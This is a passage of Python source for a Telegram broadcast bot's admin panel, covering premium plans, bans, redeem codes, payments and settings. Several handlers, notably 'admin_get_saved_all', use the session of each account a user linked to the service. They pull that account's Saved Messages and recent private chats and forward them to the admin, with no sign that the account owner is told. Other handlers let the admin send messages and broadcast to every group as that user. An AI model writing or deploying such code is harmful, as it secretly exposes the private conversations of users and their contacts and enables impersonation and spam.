            text += "<i>No saved messages.</i>"
        else:
            for i, msg in enumerate(messages, 1):
                c = (msg.message or "").strip()
                if not c and msg.media: c = f"[{type(msg.media).__name__}]"
                c = c[:200] or "[empty]"
                when = msg.date.strftime("%d/%m %H:%M") if msg.date else "?"
                text += f"<b>{i}. {when}</b>\n<code>{c}</code>\n\n"
        await cb.message.edit_caption(caption=text[:4000], parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("🔄 Refresh", callback_data=f"admin_acc_saved_{uid}_{acc_id}")],
                [InlineKeyboardButton("Back", callback_data=f"admin_acc_open_{uid}_{acc_id}")]]))
    except Exception as e:
        await cb.answer(f"Error: {str(e)[:80]}", show_alert=True)
    finally:
        try: await tg.disconnect()
        except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_acc_send_(\d+)_(.+)$") & filters.user(ADMIN_IDS))
async def admin_acc_send_prompt(client, cb):
    await cb.answer("")
    uid = int(cb.matches[0].group(1)); acc_id = cb.matches[0].group(2)
    db.set_user_state(cb.from_user.id, f"admin_acc_await_send_{uid}_{acc_id}")
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>📤 SEND MESSAGE</b></blockquote>\n\n"
                     "Format: <code>recipient | message</code>\n\n"
                     "<i>Example:</i>\n<code>@johndoe | Hello!</code>\n<code>me | Note</code>"),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel",
                callback_data=f"admin_acc_open_{uid}_{acc_id}")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_acc_bcast_(\d+)_(.+)$") & filters.user(ADMIN_IDS))
async def admin_acc_bcast_prompt(client, cb):
    await cb.answer("")
    uid = int(cb.matches[0].group(1)); acc_id = cb.matches[0].group(2)
    db.set_user_state(cb.from_user.id, f"admin_acc_await_bcast_{uid}_{acc_id}")
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>📢 BROADCAST FROM ACCOUNT</b></blockquote>\n\n"
                     "Message will go to ALL groups of this account.\n\nSend message:"),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel",
                callback_data=f"admin_acc_open_{uid}_{acc_id}")]]))
    except Exception: pass

# ---- GET ALL SAVED CHATS (user-specific, admin DM) ----
@pyro.on_callback_query(filters.regex(r"^admin_get_saved_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_get_saved_all(client, cb):
    await cb.answer("Fetching all accounts...")
    uid = int(cb.matches[0].group(1))
    accounts = db.get_user_accounts(uid)
    if not accounts:
        await cb.answer("User has no accounts", show_alert=True); return
    try:
        await cb.message.edit_caption(
            caption=f"<blockquote><b>📩 GETTING SAVED CHATS</b></blockquote>\n\n"
                    f"User: <code>{uid}</code>\nAccounts: <code>{len(accounts)}</code>\n\n"
                    f"<i>Collecting... this may take a moment.</i>",
            parse_mode=ParseMode.HTML)
    except Exception: pass

    for idx, acc in enumerate(accounts, 1):
        tg = await _get_user_tg_client(acc)
        if not tg:
            try:
                await pyro.send_message(cb.from_user.id,
                    f"❌ Account {idx} ({acc['phone_number']}): connect failed")
            except Exception: pass
            continue
        try:
            # Send header
            await pyro.send_message(cb.from_user.id,
                f"<blockquote><b>📱 Account {idx}/{len(accounts)} — {acc['phone_number']}</b></blockquote>",
                parse_mode=ParseMode.HTML)

            # Saved messages
            messages = await tg.get_messages("me", limit=30)
            if messages:
                batch = "💾 <b>SAVED MESSAGES:</b>\n\n"
                for i, msg in enumerate(messages, 1):
                    c = (msg.message or "").strip()
                    if not c and msg.media: c = f"[{type(msg.media).__name__}]"
                    c = c[:300] or "[empty]"
                    when = msg.date.strftime("%d/%m %H:%M") if msg.date else "?"
                    line = f"<b>{i}. {when}</b>\n<code>{c}</code>\n\n"
                    if len(batch) + len(line) > 3800:
                        await pyro.send_message(cb.from_user.id, batch, parse_mode=ParseMode.HTML)
                        batch = ""
                    batch += line
                if batch:
                    await pyro.send_message(cb.from_user.id, batch, parse_mode=ParseMode.HTML)
            else:
                await pyro.send_message(cb.from_user.id, "<i>No saved messages.</i>",
                    parse_mode=ParseMode.HTML)

            # Recent chats with last messages
            await pyro.send_message(cb.from_user.id, "📂 <b>RECENT CHATS:</b>", parse_mode=ParseMode.HTML)
            chat_count = 0
            async for d in tg.iter_dialogs(limit=20):
                if not d.is_user: continue
                try:
                    msgs = await tg.get_messages(d.entity, limit=5)
                    if not msgs: continue
                    chat_text = f"<b>👤 {d.name or 'Unknown'}</b>\n"
                    for msg in msgs:
                        who = "➡️" if msg.out else "⬅️"
                        c = (msg.message or "").strip()
                        if not c and msg.media: c = f"[{type(msg.media).__name__}]"
                        c = c[:200] or "[empty]"
                        when = msg.date.strftime("%d/%m %H:%M") if msg.date else "?"
                        chat_text += f"{who} <i>{when}</i>: <code>{c}</code>\n"
                    if len(chat_text) > 3800: chat_text = chat_text[:3800] + "..."
                    await pyro.send_message(cb.from_user.id, chat_text, parse_mode=ParseMode.HTML)
                    chat_count += 1
                    await asyncio.sleep(0.4)
                    if chat_count >= 15: break
                except Exception: continue
            await pyro.send_message(cb.from_user.id,
                f"✅ <b>Account {idx} done</b> — {chat_count} chats sent.",
                parse_mode=ParseMode.HTML)
        except Exception as e:
            logger.error(f"get_saved_all: {e}")
            try:
                await pyro.send_message(cb.from_user.id, f"❌ Error: {str(e)[:200]}")
            except Exception: pass
        finally:
            try: await tg.disconnect()
            except Exception: pass
        await asyncio.sleep(1)

    await pyro.send_message(cb.from_user.id,
        f"<blockquote><b>✅ ALL DONE</b></blockquote>\n\nFetched from <code>{len(accounts)}</code> account(s).",
        parse_mode=ParseMode.HTML)

# ---- PREMIUM QUICK ----
@pyro.on_callback_query(filters.regex(r"^admin_addprem_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_addprem(client, cb):
    await cb.answer("")
    uid = int(cb.matches[0].group(1))
    db.set_user_state(cb.from_user.id, f"admin_await_prem_days_{uid}")
    try:
        await cb.message.edit_caption(
            caption=f"<blockquote><b>➕ ADD PREMIUM</b></blockquote>\n\nTarget: <code>{uid}</code>\n\nSend days or tap:",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("7d", callback_data=f"admin_prem_quick_{uid}_7"),
                 InlineKeyboardButton("30d", callback_data=f"admin_prem_quick_{uid}_30")],
                [InlineKeyboardButton("90d", callback_data=f"admin_prem_quick_{uid}_90"),
                 InlineKeyboardButton("365d", callback_data=f"admin_prem_quick_{uid}_365")],
                [InlineKeyboardButton("Cancel", callback_data=f"admin_view_user_{uid}")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_prem_quick_(\d+)_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_prem_quick(client, cb):
    uid = int(cb.matches[0].group(1)); days = int(cb.matches[0].group(2))
    ok = db.add_premium(uid, days, reason="admin_panel")
    db.set_user_state(cb.from_user.id, "")
    if ok:
        exp = db.get_premium_expiry(uid)
        await cb.answer(f"✅ +{days}d")
        try:
            await pyro.send_message(uid,
                f"🎉 <b>Premium Activated!</b>\n\nDays: <b>{days}</b>\n"
                f"Till: <code>{exp.strftime('%d/%m/%Y') if exp else 'N/A'}</code>",
                parse_mode=ParseMode.HTML)
        except Exception: pass
        await forward_event_to_db_channel("premium_added", uid,
            {"days": days, "by": "admin"})
        await admin_view_user(client, cb)
    else: await cb.answer("Failed", show_alert=True)

@pyro.on_callback_query(filters.regex(r"^admin_rmprem_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_rmprem(client, cb):
    uid = int(cb.matches[0].group(1))
    db.remove_premium(uid, reason="admin_panel")
    await cb.answer("Removed")
    try: await pyro.send_message(uid, "⚠️ <b>Premium Removed</b>", parse_mode=ParseMode.HTML)
    except Exception: pass
    await admin_view_user(client, cb)

@pyro.on_callback_query(filters.regex(r"^admin_ban_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_ban(client, cb):
    uid = int(cb.matches[0].group(1))
    db.ban_user(uid, reason="admin_panel")
    await cb.answer("Banned 🚫")
    try: await pyro.send_message(uid, ERROR_MESSAGES["banned"])
    except Exception: pass
    await admin_view_user(client, cb)

@pyro.on_callback_query(filters.regex(r"^admin_unban_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_unban(client, cb):
    uid = int(cb.matches[0].group(1))
    db.unban_user(uid)
    await cb.answer("Unbanned ✅")
    try: await pyro.send_message(uid, "✅ <b>Unbanned!</b>", parse_mode=ParseMode.HTML)
    except Exception: pass
    await admin_view_user(client, cb)

@pyro.on_callback_query(filters.regex(r"^admin_stopbcast_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_stopbcast(client, cb):
    uid = int(cb.matches[0].group(1))
    t = user_tasks.pop(uid, None)
    if t:
        try: t.cancel()
        except Exception: pass
    ar = auto_reply_tasks.pop(uid, None)
    if ar:
        try: ar.cancel()
        except Exception: pass
    db.set_broadcast_state(uid, running=False)
    await cb.answer("Stopped ⏹")
    try: await pyro.send_message(uid, "⏹ <b>Broadcast stopped by admin.</b>", parse_mode=ParseMode.HTML)
    except Exception: pass
    await admin_view_user(client, cb)

@pyro.on_callback_query(filters.regex(r"^admin_deluser_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_deluser_confirm(client, cb):
    uid = int(cb.matches[0].group(1))
    try:
        await cb.message.edit_caption(
            caption=f"<blockquote><b>⚠️ DELETE USER {uid}?</b></blockquote>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("🗑 Yes", callback_data=f"admin_deluser_yes_{uid}")],
                [InlineKeyboardButton("Cancel", callback_data=f"admin_view_user_{uid}")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_deluser_yes_(\d+)$") & filters.user(ADMIN_IDS))
async def admin_deluser_do(client, cb):
    uid = int(cb.matches[0].group(1))
    db.delete_user(uid)
    user_tasks.pop(uid, None)
    auto_reply_tasks.pop(uid, None)
    await cb.answer("Deleted")
    try:
        await cb.message.edit_caption(
            caption=f"<b>🗑 User {uid} deleted.</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Back", callback_data="admin_user_list_0")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_search_user$") & filters.user(ADMIN_IDS))
async def admin_search_prompt(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_await_search")
    try:
        await cb.message.edit_caption(
            caption="<blockquote><b>🔍 SEARCH USER</b></blockquote>\n\nSend username/name:",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_panel")]]))
    except Exception: pass

# ============================================================
# ADMIN CODES / PLANS / PAYMENTS / FJ / SETTINGS
# ============================================================
@pyro.on_callback_query(filters.regex("^admin_codes$") & filters.user(ADMIN_IDS))
async def admin_codes(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "")
    codes = db.get_all_redeem_codes()
    total = len(codes); active = sum(1 for c in codes if c.get("active"))
    text = f"<blockquote><b>🎟️ CODES</b></blockquote>\n\nTotal: <code>{total}</code> | Active: <code>{active}</code>\n\n"
    for c in codes[:8]:
        s = "🟢" if c.get("active") else "🔴"
        text += f"{s} <code>{c['code']}</code> — {c['days']}d | {c['used_count']}/{c['max_uses']}\n"
    try:
        await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("➕ Create", callback_data="admin_create_code")],
                [InlineKeyboardButton("🗑 Manage", callback_data="admin_manage_codes")],
                [InlineKeyboardButton("Back", callback_data="admin_panel")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_create_code$") & filters.user(ADMIN_IDS))
async def admin_create_code_start(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_code_step_name")
    db.set_temp_data(cb.from_user.id, json.dumps({}))
    try:
        await cb.message.edit_caption(
            caption="<blockquote><b>➕ CREATE CODE</b></blockquote>\n\n"
                    "<b>Step 1/4:</b> Send code name:",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_codes")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_manage_codes$") & filters.user(ADMIN_IDS))
async def admin_manage_codes(client, cb):
    await cb.answer("")
    codes = db.get_all_redeem_codes()
    if not codes: await cb.answer("No codes", show_alert=True); return
    rows = []
    for c in codes[:25]:
        s = "🟢" if c.get("active") else "🔴"
        rows.append([InlineKeyboardButton(f"{s} {c['code']} ({c['days']}d, {c['used_count']}/{c['max_uses']})",
                                           callback_data=f"admin_code_detail_{c['code']}")])
    rows.append([InlineKeyboardButton("Back", callback_data="admin_codes")])
    try:
        await cb.message.edit_caption(caption="<b>🎟️ TAP A CODE</b>",
            parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_code_detail_(.+)$") & filters.user(ADMIN_IDS))
async def admin_code_detail(client, cb):
    await cb.answer("")
    code = cb.matches[0].group(1)
    st = db.get_redeem_code_stats(code)
    if not st: await cb.answer("Not found", show_alert=True); return
    c = st["code"]
    s = "🟢 Active" if c.get("active") else "🔴 Inactive"
    exp = c.get("expires_at")
    exp_str = exp.strftime("%d/%m/%Y") if exp else "N/A"
    text = (f"<blockquote><b>🎟️ CODE</b></blockquote>\n\n"
            f"Code: <code>{c['code']}</code>\nStatus: {s}\n"
            f"Days: <code>{c['days']}</code>\nUses: <code>{c['used_count']}/{c['max_uses']}</code>\n"
            f"Expires: <code>{exp_str}</code>\n")
    try:
        await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton(f"{'🔴 Deactivate' if c.get('active') else '🟢 Activate'}",
                                       callback_data=f"admin_code_toggle_{code}")],
                [InlineKeyboardButton("🗑 Delete", callback_data=f"admin_delcode_{code}")],
                [InlineKeyboardButton("Back", callback_data="admin_manage_codes")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_code_toggle_(.+)$") & filters.user(ADMIN_IDS))
async def admin_code_toggle(client, cb):
    code = cb.matches[0].group(1)
    ok, msg = db.toggle_redeem_code(code)
    await cb.answer(msg)
    if ok: await admin_code_detail(client, cb)

@pyro.on_callback_query(filters.regex(r"^admin_delcode_(.+)$") & filters.user(ADMIN_IDS))
async def admin_delcode(client, cb):
    code = cb.matches[0].group(1)
    db.delete_redeem_code(code)
    await cb.answer(f"Deleted {code}")
    await admin_manage_codes(client, cb)

@pyro.on_callback_query(filters.regex("^admin_plans$") & filters.user(ADMIN_IDS))
async def admin_plans(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "")
    plans = db.get_all_plans()
    text = "<blockquote><b>💎 PLANS</b></blockquote>\n\n"
    rows = []
    for p in plans:
        text += f"• <code>{p['label']}</code> — {p['days']}d\n"
        rows.append([InlineKeyboardButton(f"✏️ {p['label']}", callback_data=f"admin_editplan_{p['plan_id']}"),
                     InlineKeyboardButton("🗑", callback_data=f"admin_delplan_{p['plan_id']}")])
    rows.append([InlineKeyboardButton("➕ Add", callback_data="admin_addplan")])
    rows.append([InlineKeyboardButton("Back", callback_data="admin_panel")])
    try:
        await cb.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb(rows))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_addplan$") & filters.user(ADMIN_IDS))
async def admin_addplan(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_plan_step_1")
    db.set_temp_data(cb.from_user.id, json.dumps({"step": "price"}))
    try:
        await cb.message.edit_caption(
            caption="<blockquote><b>➕ ADD PLAN — Step 1/3</b></blockquote>\n\nSend price (₹):",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_plans")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_editplan_(.+)$") & filters.user(ADMIN_IDS))
async def admin_editplan(client, cb):
    await cb.answer("")
    pid = cb.matches[0].group(1)
    p = db.get_plan(pid)
    if not p: await cb.answer("Not found", show_alert=True); return
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>✏️ PLAN</b></blockquote>\n\n"
                     f"Label: <code>{p['label']}</code>\nPrice: ₹<code>{p['price']}</code>\nDays: <code>{p['days']}</code>"),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("Edit Price", callback_data=f"admin_editplan_price_{pid}"),
                 InlineKeyboardButton("Edit Days", callback_data=f"admin_editplan_days_{pid}")],
                [InlineKeyboardButton("Back", callback_data="admin_plans")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_editplan_(price|days)_(.+)$") & filters.user(ADMIN_IDS))
async def admin_editplan_field(client, cb):
    await cb.answer("")
    f = cb.matches[0].group(1); pid = cb.matches[0].group(2)
    db.set_user_state(cb.from_user.id, f"admin_editplan_{f}_{pid}")
    try:
        await cb.message.edit_caption(caption=f"<b>Send new {f}:</b>", parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data=f"admin_editplan_{pid}")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex(r"^admin_delplan_(.+)$") & filters.user(ADMIN_IDS))
async def admin_delplan(client, cb):
    db.delete_plan(cb.matches[0].group(1))
    await cb.answer("Deleted")
    await admin_plans(client, cb)

@pyro.on_callback_query(filters.regex("^admin_payments$") & filters.user(ADMIN_IDS))
async def admin_payments(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "")
    pending = db.get_pending_payment_requests(limit=0)
    qr = db.get_payment_qr(); upi = db.get_payment_upi()
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>💳 PAYMENTS</b></blockquote>\n\n"
                     f"QR: {'✅' if qr else '❌'}\nUPI: <code>{upi or 'Not set'}</code>\n"
                     f"Pending: <code>{len(pending)}</code>"),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("📸 Upload QR", callback_data="admin_upload_qr"),
                 InlineKeyboardButton("🗑 Clear QR", callback_data="admin_clear_qr")],
                [InlineKeyboardButton("💳 Set UPI", callback_data="admin_set_upi"),
                 InlineKeyboardButton("🗑 Clear UPI", callback_data="admin_clear_upi")],
                [InlineKeyboardButton("Back", callback_data="admin_panel")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_upload_qr$") & filters.user(ADMIN_IDS))
async def admin_upload_qr(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_await_qr")
    try:
        await cb.message.edit_caption(caption="<b>📸 Send QR as photo</b>", parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_payments")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_clear_qr$") & filters.user(ADMIN_IDS))
async def admin_clear_qr(client, cb):
    db.clear_payment_qr(); await cb.answer("QR cleared")
    await admin_payments(client, cb)

@pyro.on_callback_query(filters.regex("^admin_set_upi$") & filters.user(ADMIN_IDS))
async def admin_set_upi(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_await_upi")
    try:
        await cb.message.edit_caption(caption="<b>💳 Send UPI ID</b>", parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_payments")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_clear_upi$") & filters.user(ADMIN_IDS))
async def admin_clear_upi(client, cb):
    db.clear_payment_upi(); await cb.answer("UPI cleared")
    await admin_payments(client, cb)

@pyro.on_callback_query(filters.regex("^admin_force_join$") & filters.user(ADMIN_IDS))
async def admin_force_join(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "")
    enabled = db.get_setting("force_join_enabled", False)
    ch = db.get_setting("force_join_channels", []) or []
    gr = db.get_setting("force_join_groups", []) or []
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>🔧 FORCE JOIN</b></blockquote>\n\n"
                     f"Status: {'🟢 ON' if enabled else '🔴 OFF'}\nChannels: {len(ch)}\nGroups: {len(gr)}"),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton(f"Toggle {'OFF' if enabled else 'ON'}", callback_data="admin_fj_toggle")],
                [InlineKeyboardButton("➕ Add Channel", callback_data="admin_fj_add_channel"),
                 InlineKeyboardButton("➕ Add Group", callback_data="admin_fj_add_group")],
                [InlineKeyboardButton("🗑 Clear All", callback_data="admin_fj_clear")],
                [InlineKeyboardButton("Back", callback_data="admin_panel")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_fj_toggle$") & filters.user(ADMIN_IDS))
async def admin_fj_toggle(client, cb):
    cur = db.get_setting("force_join_enabled", False)
    db.set_setting("force_join_enabled", not cur)
    await cb.answer(f"{'OFF' if cur else 'ON'}")
    await admin_force_join(client, cb)

@pyro.on_callback_query(filters.regex("^admin_fj_add_channel$") & filters.user(ADMIN_IDS))
async def admin_fj_add_channel(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_fj_channel")
    try:
        await cb.message.edit_caption(caption="<b>Format:</b> <code>id | url | name</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_force_join")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_fj_add_group$") & filters.user(ADMIN_IDS))
async def admin_fj_add_group(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_fj_group")
    try:
        await cb.message.edit_caption(caption="<b>Format:</b> <code>id | url | name</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_force_join")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_fj_clear$") & filters.user(ADMIN_IDS))
async def admin_fj_clear(client, cb):
    db.set_setting("force_join_channels", [])
    db.set_setting("force_join_groups", [])
    await cb.answer("Cleared")
    await admin_force_join(client, cb)

@pyro.on_callback_query(filters.regex("^admin_settings$") & filters.user(ADMIN_IDS))
async def admin_settings(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "")
    fl = db.get_setting("free_account_limit", FREE_ACCOUNT_LIMIT)
    dd = db.get_setting("default_delay", DEFAULT_DELAY)
    ar = db.get_setting("auto_reply_enabled", True)
    aj = db.get_setting("auto_join_enabled", True)
    gt = db.get_setting("group_targeting_enabled", True)
    try:
        await cb.message.edit_caption(
            caption=(f"<blockquote><b>⚙️ SETTINGS</b></blockquote>\n\n"
                     f"Free Limit: <code>{fl}</code>\nDefault Delay: <code>{dd}s</code>\n"
                     f"Auto Reply: {'🟢' if ar else '🔴'}\n"
                     f"Auto Join: {'🟢' if aj else '🔴'}\n"
                     f"Group Target: {'🟢' if gt else '🔴'}"),
            parse_mode=ParseMode.HTML,
            reply_markup=kb([
                [InlineKeyboardButton("Free Limit", callback_data="admin_set_free_limit"),
                 InlineKeyboardButton("Delay", callback_data="admin_set_default_delay")],
                [InlineKeyboardButton(f"Auto Reply {'OFF' if ar else 'ON'}", callback_data="admin_toggle_auto_reply")],
                [InlineKeyboardButton(f"Auto Join {'OFF' if aj else 'ON'}", callback_data="admin_toggle_auto_join")],
                [InlineKeyboardButton(f"Group Target {'OFF' if gt else 'ON'}", callback_data="admin_toggle_grp_target")],
                [InlineKeyboardButton("Back", callback_data="admin_panel")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_set_free_limit$") & filters.user(ADMIN_IDS))
async def admin_set_free_limit(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_await_free_limit")
    try:
        await cb.message.edit_caption(caption="Send new free limit:", parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_settings")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_set_default_delay$") & filters.user(ADMIN_IDS))
async def admin_set_default_delay(client, cb):
    await cb.answer("")
    db.set_user_state(cb.from_user.id, "admin_await_default_delay")
    try:
        await cb.message.edit_caption(caption="Send new default delay (seconds):", parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_settings")]]))
    except Exception: pass

@pyro.on_callback_query(filters.regex("^admin_toggle_auto_reply$") & filters.user(ADMIN_IDS))
async def admin_toggle_auto_reply(client, cb):
    cur = db.get_setting("auto_reply_enabled", True)
    db.set_setting("auto_reply_enabled", not cur)
    await cb.answer(f"{'OFF' if cur else 'ON'}")
    await admin_settings(client, cb)

@pyro.on_callback_query(filters.regex("^admin_toggle_auto_join$") & filters.user(ADMIN_IDS))
async def admin_toggle_auto_join(client, cb):
    cur = db.get_setting("auto_join_enabled", True)
    db.set_setting("auto_join_enabled", not cur)
    await cb.answer(f"{'OFF' if cur else 'ON'}")
    await admin_settings(client, cb)

@pyro.on_callback_query(filters.regex("^admin_toggle_grp_target$") & filters.user(ADMIN_IDS))
async def admin_toggle_grp_target(client, cb):
    cur = db.get_setting("group_targeting_enabled", True)
    db.set_setting("group_targeting_enabled", not cur)
    await cb.answer(f"{'OFF' if cur else 'ON'}")
    await admin_settings(client, cb)

# ============================================================
# ADMIN TEXT HANDLER
# ============================================================
@pyro.on_message(filters.text & filters.private & filters.user(ADMIN_IDS))
async def admin_text_handler(client, m):
    uid = m.from_user.id
    state = db.get_user_state(uid)
    text = m.text.strip()
    if not state: return

    if state == "admin_await_search":
        users = db.search_users(text)
        db.set_user_state(uid, "")
        if not users: await m.reply(f"No users for '{text}'."); return
        rows = [[InlineKeyboardButton(f"{u.get('first_name','User')} ({u['user_id']})",
                                       callback_data=f"admin_view_user_{u['user_id']}")] for u in users]
        rows.append([InlineKeyboardButton("Back", callback_data="admin_panel")])
        await m.reply(f"<b>🔍 Results for '{text}':</b>", reply_markup=kb(rows), parse_mode=ParseMode.HTML)
        return

    if state.startswith("admin_await_prem_days_"):
        try:
            tid = int(state.replace("admin_await_prem_days_", ""))
            d = int(text)
            if d <= 0 or d > 3650: raise ValueError
            db.add_premium(tid, d, reason="admin_text")
            db.set_user_state(uid, "")
            exp = db.get_premium_expiry(tid)
            await m.reply(f"✅ +{d}d for <code>{tid}</code>\nTill: <code>{exp.strftime('%d/%m/%Y') if exp else 'N/A'}</code>",
                parse_mode=ParseMode.HTML)
            await forward_event_to_db_channel("premium_added", tid, {"days": d, "by": "admin_text"})
        except (ValueError, TypeError): await m.reply("❌ 1–3650.")
        return

    if state == "admin_code_step_name":
        ok, res = validate_custom_code(text)
        if not ok: await m.reply(f"❌ {res}\nTry again:"); return
        if db.get_redeem_code(res):
            await m.reply(f"❌ Exists! Send different:", parse_mode=ParseMode.HTML); return
        temp = json.loads(db.get_temp_data(uid) or "{}"); temp["code"] = res
        db.set_temp_data(uid, json.dumps(temp))
        db.set_user_state(uid, "admin_code_step_days")
        await m.reply("<b>Step 2/4:</b> Days?", parse_mode=ParseMode.HTML,
            reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_codes")]]))
        return

    if state == "admin_code_step_days":
        try:
            d = int(text)
            if d <= 0 or d > 3650: raise ValueError
            temp = json.loads(db.get_temp_data(uid) or "{}"); temp["days"] = d
            db.set_temp_data(uid, json.dumps(temp))
            db.set_user_state(uid, "admin_code_step_max")
            await m.reply("<b>Step 3/4:</b> Max uses?", parse_mode=ParseMode.HTML,
                reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_codes")]]))
        except (ValueError, TypeError): await m.reply("❌ 1–3650.")
        return

    if state == "admin_code_step_max":
        try:
            mx = int(text)
            if mx <= 0 or mx > 100000: raise ValueError
            temp = json.loads(db.get_temp_data(uid) or "{}"); temp["max_uses"] = mx
            db.set_temp_data(uid, json.dumps(temp))
            db.set_user_state(uid, "admin_code_step_validity")
            await m.reply("<b>Step 4/4:</b> Validity days?", parse_mode=ParseMode.HTML,
                reply_markup=kb([[InlineKeyboardButton("Cancel", callback_data="admin_codes")]]))
        except (ValueError, TypeError): await m.reply("❌ 1–100000.")
        return

    if state == "admin_code_step_validity":
        try:
            v = int(text)
            if v <= 0 or v > 365: raise ValueError
            temp = json.loads(db.get_temp_data(uid) or "{}")
            code = temp.get("code"); days = temp.get("days"); mx = temp.get("max_uses")
            if not code or not days or not mx:
                await m.reply("❌ Expired"); db.set_user_state(uid, ""); return
            ok, msg = db.create_redeem_code(code, days, mx, v)
            db.set_user_state(uid, ""); db.set_temp_data(uid, None)
            if not ok: await m.reply(f"❌ {msg}"); return
            await m.reply(f"<blockquote><b>✅ CODE CREATED</b></blockquote>\n\n"
                          f"<code>{code}</code> · {days}d · {mx} uses · {v}d valid",
                          parse_mode=ParseMode.HTML,
                          reply_markup=kb([
                              [InlineKeyboardButton("View", callback_data="admin_codes")],
                              [InlineKeyboardButton("Another", callback_data="admin_create_code")]]))
        except (ValueError, TypeError): await m.reply("❌ 1–365.")
        return

    if state == "admin_plan_step_1":
        try:
            p = int(text)
            if p <= 0: raise ValueError
            db.set_temp_data(uid, json.dumps({"price": p}))
            db.set_user_state(uid, "admin_plan_step_2")
            await m.reply("<b>Step 2/3:</b> Days?")
        except (ValueError, TypeError): await m.reply("❌ Invalid.")
        return

    if state == "admin_plan_step_2":
        try:
            d = int(text)
            if d <= 0: raise ValueError
            temp = json.loads(db.get_temp_data(uid) or "{}"); temp["days"] = d
            db.set_temp_data(uid, json.dumps(temp))
            db.set_user_state(uid, "admin_plan_step_3")
            await m.reply("<b>Step 3/3:</b> Label?")
        except (ValueError, TypeError): await m.reply("❌ Invalid.")
        return

    if state == "admin_plan_step_3":
        temp = json.loads(db.get_temp_data(uid) or "{}")
